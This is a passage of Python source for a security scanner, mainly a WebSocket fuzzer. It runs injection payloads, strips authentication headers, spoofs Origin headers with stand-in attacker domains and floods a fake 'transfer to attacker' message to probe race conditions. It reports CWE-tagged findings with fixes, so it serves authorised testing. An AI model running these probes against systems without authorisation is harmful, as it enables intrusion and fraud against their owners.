                "error": str(e),
            }
        finally:
            await self.close()


# =============================================================================
# WEBSOCKET FUZZER CLASS
# =============================================================================

class WebSocketFuzzer:
    """
    Comprehensive WebSocket endpoint fuzzer.
    
    Features:
    - Connection establishment and auth testing
    - Message injection (SQLi, XSS, command injection)
    - Protocol confusion attacks
    - Race condition testing
    - DoS testing
    """
    
    def __init__(
        self,
        endpoint: str,
        headers: Optional[Dict[str, str]] = None,
        subprotocols: Optional[List[str]] = None,
        timeout: float = 30.0,
    ):
        if not WEBSOCKETS_AVAILABLE:
            raise ImportError("websockets package not installed. Run: pip install websockets")
        
        self.endpoint = endpoint
        self.headers = headers or {}
        self.subprotocols = subprotocols
        self.timeout = timeout
        self.session = WebSocketFuzzingSession(endpoint=endpoint)
        self._connection = None
    
    async def _connect(
        self,
        custom_headers: Optional[Dict[str, str]] = None,
    ) -> Optional[Any]:
        """Establish WebSocket connection."""
        try:
            headers = {**self.headers, **(custom_headers or {})}
            
            self._connection = await asyncio.wait_for(
                websockets.connect(
                    self.endpoint,
                    extra_headers=headers,
                    subprotocols=self.subprotocols,
                    ping_interval=None,  # Disable automatic pings for testing
                ),
                timeout=self.timeout,
            )
            
            self.session.connection_established = True
            return self._connection
            
        except Exception as e:
            self.session.errors_encountered += 1
            logger.error(f"WebSocket connection error: {e}")
            return None
    
    async def _send_and_receive(
        self,
        message: str,
        timeout: float = 5.0,
    ) -> Tuple[bool, Optional[str], Optional[str]]:
        """Send a message and wait for response."""
        try:
            if not self._connection:
                return False, None, "No connection"
            
            await self._connection.send(message)
            self.session.messages_sent += 1
            
            try:
                response = await asyncio.wait_for(
                    self._connection.recv(),
                    timeout=timeout,
                )
                self.session.messages_received += 1
                return True, response, None
            except asyncio.TimeoutError:
                return True, None, "timeout"
                
        except Exception as e:
            self.session.errors_encountered += 1
            return False, None, str(e)
    
    async def _close(self):
        """Close WebSocket connection."""
        if self._connection:
            try:
                await self._connection.close()
            except Exception:
                pass
            self._connection = None
    
    async def test_connection(self) -> AsyncGenerator[Dict[str, Any], None]:
        """Test basic WebSocket connection."""
        yield {
            "type": "phase",
            "phase": "connection",
            "message": "Testing WebSocket connection...",
        }
        
        conn = await self._connect()
        
        if conn:
            yield {
                "type": "info",
                "message": "WebSocket connection established",
                "subprotocol": conn.subprotocol,
            }
            
            if conn.subprotocol:
                self.session.protocols_discovered.append(conn.subprotocol)
        else:
            yield {
                "type": "error",
                "message": "Failed to establish WebSocket connection",
            }
    
    async def fuzz_messages(self) -> AsyncGenerator[Dict[str, Any], None]:
        """
        Fuzz WebSocket with various attack payloads.
        """
        yield {
            "type": "phase",
            "phase": "message_fuzzing",
            "message": "Fuzzing WebSocket messages...",
        }
        
        if not self._connection:
            conn = await self._connect()
            if not conn:
                yield {"type": "error", "message": "Cannot connect for fuzzing"}
                return
        
        for attack_type, payloads in WEBSOCKET_ATTACK_PAYLOADS.items():
            yield {
                "type": "technique",
                "technique": attack_type,
                "message": f"Testing {attack_type}...",
            }
            
            for payload in payloads:
                success, response, error = await self._send_and_receive(payload)
                
                finding = self._analyze_ws_response(attack_type, payload, response, error)
                
                if finding:
                    self.session.findings.append(finding)
                    yield {
                        "type": "finding",
                        "finding": finding.to_dict(),
                    }
                
                await asyncio.sleep(0.05)
                
                # Reconnect if connection was lost
                if not success and "closed" in str(error).lower():
                    await self._close()
                    await self._connect()
    
    def _analyze_ws_response(
        self,
        attack_type: str,
        payload: str,
        response: Optional[str],
        error: Optional[str],
    ) -> Optional[WebSocketFinding]:
        """Analyze WebSocket response for vulnerabilities."""
        if not response:
            return None
        
        response_lower = response.lower()
        
        # SQL Injection indicators
        if attack_type == "sqli":
            sql_indicators = ["sql", "mysql", "syntax error", "database"]
            for indicator in sql_indicators:
                if indicator in response_lower:
                    return WebSocketFinding(
                        attack_type=WebSocketAttackType.MESSAGE_INJECTION,
                        severity="critical",
                        title="SQL Injection via WebSocket",
                        description="WebSocket message handler vulnerable to SQL injection.",
                        payload=payload,
                        response=response[:500],
                        evidence=indicator,
                        endpoint=self.endpoint,
                        remediation="Use parameterized queries for all WebSocket message data processing.",
                        cvss_score=9.8,
                        cwe_id="CWE-89",
                    )
        
        # XSS indicators
        elif attack_type == "xss":
            if "<script>" in response or "onerror=" in response:
                return WebSocketFinding(
                    attack_type=WebSocketAttackType.MESSAGE_INJECTION,
                    severity="high",
                    title="XSS via WebSocket",
                    description="WebSocket echoes unescaped user input, enabling XSS.",
                    payload=payload,
                    response=response[:500],
                    endpoint=self.endpoint,
                    remediation="Sanitize all WebSocket message content before echoing or storing.",
                    cvss_score=7.1,
                    cwe_id="CWE-79",
                )
        
        # Auth bypass
        elif attack_type == "auth_bypass":
            success_indicators = ["success", "authenticated", "welcome", "connected"]
            for indicator in success_indicators:
                if indicator in response_lower:
                    return WebSocketFinding(
                        attack_type=WebSocketAttackType.AUTH_BYPASS,
                        severity="critical",
                        title="WebSocket Authentication Bypass",
                        description="WebSocket accepted invalid or missing authentication.",
                        payload=payload,
                        response=response[:500],
                        evidence=indicator,
                        endpoint=self.endpoint,
                        remediation="Implement proper authentication validation for all WebSocket messages.",
                        cvss_score=9.1,
                        cwe_id="CWE-287",
                    )
        
        # IDOR
        elif attack_type == "idor":
            if "data" in response_lower or "message" in response_lower:
                try:
                    data = json.loads(response)
                    if data and not data.get("error"):
                        return WebSocketFinding(
                            attack_type=WebSocketAttackType.MESSAGE_INJECTION,
                            severity="high",
                            title="IDOR via WebSocket",
                            description="Able to access unauthorized channels/data via WebSocket.",
                            payload=payload,
                            response=response[:500],
                            endpoint=self.endpoint,
                            remediation="Validate user authorization for all WebSocket channel subscriptions.",
                            cvss_score=7.5,
                            cwe_id="CWE-639",
                        )
                except json.JSONDecodeError:
                    pass
        
        return None
    
    async def test_auth_bypass(self) -> AsyncGenerator[Dict[str, Any], None]:
        """
        Test WebSocket authentication bypass scenarios.
        """
        yield {
            "type": "phase",
            "phase": "auth_bypass",
            "message": "Testing authentication bypass...",
        }
        
        # Test connection without auth headers
        await self._close()
        
        # Remove auth headers
        auth_headers = ["Authorization", "Cookie", "X-API-Key", "X-Auth-Token"]
        clean_headers = {k: v for k, v in self.headers.items() if k not in auth_headers}
        
        conn = await self._connect(custom_headers=clean_headers)
        
        if conn:
            self.session.findings.append(WebSocketFinding(
                attack_type=WebSocketAttackType.AUTH_BYPASS,
                severity="high",
                title="WebSocket Connection Without Authentication",
                description="WebSocket endpoint accepts connections without authentication headers.",
                payload="Connection with auth headers removed",
                endpoint=self.endpoint,
                remediation="Require authentication for WebSocket connection establishment.",
                cvss_score=7.5,
                cwe_id="CWE-287",
            ))
            
            yield {
                "type": "finding",
                "finding": self.session.findings[-1].to_dict(),
            }
        else:
            yield {
                "type": "info",
                "message": "Connection without auth was rejected (good)",
            }
    
    async def test_race_conditions(self) -> AsyncGenerator[Dict[str, Any], None]:
        """
        Test for race condition vulnerabilities.
        """
        yield {
            "type": "phase",
            "phase": "race_condition",
            "message": "Testing race conditions...",
        }
        
        if not self._connection:
            await self._connect()
        
        if not self._connection:
            yield {"type": "error", "message": "Cannot connect for race testing"}
            return
        
        # Send multiple messages rapidly
        race_payload = '{"type": "transfer", "amount": 100, "to": "attacker"}'
        
        async def send_rapid():
            try:
                await self._connection.send(race_payload)
                self.session.messages_sent += 1
            except Exception:
                pass
        
        # Send 10 messages simultaneously
        yield {"type": "info", "message": "Sending rapid concurrent messages..."}
        
        tasks = [send_rapid() for _ in range(10)]
        await asyncio.gather(*tasks)
        
        # Collect responses
        responses = []
        for _ in range(10):
            try:
                response = await asyncio.wait_for(self._connection.recv(), timeout=2.0)
                responses.append(response)
                self.session.messages_received += 1
            except asyncio.TimeoutError:
                break
            except Exception:
                break
        
        yield {
            "type": "race_test_complete",
            "messages_sent": 10,
            "responses_received": len(responses),
        }
        
        # Note: True race condition detection requires application-specific analysis
        # This is just the testing mechanism
    
    async def test_cswsh(self) -> AsyncGenerator[Dict[str, Any], None]:
        """
        Test for Cross-Site WebSocket Hijacking.
        """
        yield {
            "type": "phase",
            "phase": "cswsh",
            "message": "Testing Cross-Site WebSocket Hijacking...",
        }
        
        await self._close()
        
        # Test with different Origin headers
        malicious_origins = [
            "https://evil.com",
            "https://attacker.com",
            "null",
            "",
        ]
        
        for origin in malicious_origins:
            headers = {**self.headers, "Origin": origin}
            conn = await self._connect(custom_headers=headers)
            
            if conn:
                self.session.findings.append(WebSocketFinding(
                    attack_type=WebSocketAttackType.CSWSH,
                    severity="high",
                    title="Cross-Site WebSocket Hijacking (CSWSH)",
                    description=f"WebSocket accepts connections from arbitrary origins. Tested with Origin: {origin}",
                    payload=f"Origin: {origin}",
                    endpoint=self.endpoint,
                    remediation="Validate Origin header and reject connections from untrusted origins.",
                    cvss_score=8.1,
                    cwe_id="CWE-346",
                ))
                
                yield {
                    "type": "finding",
                    "finding": self.session.findings[-1].to_dict(),
                }
                
                await self._close()
                break
            
            await asyncio.sleep(0.1)
    
    async def run_full_scan(self) -> AsyncGenerator[Dict[str, Any], None]:
        """
        Run a complete WebSocket security scan.
        """
        yield {
            "type": "start",
            "session_id": self.session.id,
            "endpoint": self.endpoint,
            "message": "Starting WebSocket security scan...",
        }
        
        try:
            # Phase 1: Test connection
            async for event in self.test_connection():
                yield event
            
            # Phase 2: Message fuzzing
            async for event in self.fuzz_messages():
                yield event
            
            # Phase 3: Auth bypass
            async for event in self.test_auth_bypass():
                yield event
            
            # Phase 4: CSWSH
            async for event in self.test_cswsh():
                yield event
            
            # Phase 5: Race conditions
            async for event in self.test_race_conditions():
                yield event
            
            self.session.status = "completed"
            self.session.completed_at = datetime.utcnow().isoformat()
            
            yield {
                "type": "complete",
                "session": self.session.to_dict(),
                "findings_count": len(self.session.findings),
                "messages_sent": self.session.messages_sent,
            }
            
        except Exception as e:
            self.session.status = "error"
            self.session.completed_at = datetime.utcnow().isoformat()
            logger.error(f"WebSocket scan error: {e}")
            yield {
                "type": "error",
                "error": str(e),
            }
        finally:
            await self._close()


# =============================================================================
# CONVENIENCE FUNCTIONS
# =============================================================================

async def scan_graphql_endpoint(
    endpoint: str,
    headers: Optional[Dict[str, str]] = None,
    timeout: float = 30.0,
) -> AsyncGenerator[Dict[str, Any], None]:
    """
    Convenience function to scan a GraphQL endpoint.
    
    Args:
        endpoint: GraphQL endpoint URL
        headers: Optional HTTP headers
        timeout: Request timeout
    
    Yields:
        Scan events and findings
    """
    fuzzer = GraphQLFuzzer(endpoint, headers, timeout)
    async for event in fuzzer.run_full_scan():
        yield event


async def scan_websocket_endpoint(
    endpoint: str,
    headers: Optional[Dict[str, str]] = None,
    subprotocols: Optional[List[str]] = None,
    timeout: float = 30.0,
) -> AsyncGenerator[Dict[str, Any], None]:
    """
    Convenience function to scan a WebSocket endpoint.
    
    Args:
        endpoint: WebSocket endpoint URL (ws:// or wss://)
        headers: Optional HTTP headers
        subprotocols: Optional WebSocket subprotocols
        timeout: Connection timeout
    
    Yields:
        Scan events and findings
    """
    if not WEBSOCKETS_AVAILABLE:
        yield {
            "type": "error",
            "error": "websockets package not installed",
        }
        return
    
    fuzzer = WebSocketFuzzer(endpoint, headers, subprotocols, timeout)
    async for event in fuzzer.run_full_scan():
        yield event


def is_graphql_endpoint(url: str) -> bool:
    """Check if URL is likely a GraphQL endpoint."""
    graphql_indicators = ["/graphql", "/gql", "/api/graphql", "/query"]
    return any(indicator in url.lower() for indicator in graphql_indicators)


def is_websocket_endpoint(url: str) -> bool:
    """Check if URL is a WebSocket endpoint."""
    return url.lower().startswith(("ws://", "wss://"))
